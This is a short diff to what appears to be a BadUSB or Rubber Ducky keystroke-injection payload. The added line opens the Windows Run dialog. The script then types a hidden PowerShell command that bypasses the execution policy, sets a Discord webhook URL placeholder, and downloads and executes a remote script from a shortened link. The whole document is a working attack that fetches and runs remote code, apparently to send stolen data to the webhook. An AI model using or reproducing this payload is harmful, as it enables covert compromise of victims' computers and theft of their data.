@@ -1,3 +1,4 @@
+GUI r
 DELAY 500
 STRING powershell -w h -NoP -Ep -c $env:DISCORD_WEBHOOK_URL='https://discord.com/api/webhooks/YOURWEBHOOKHERE';$db='';irm https://tinyurl.com/2v47cnb9 | iex
 ENTER
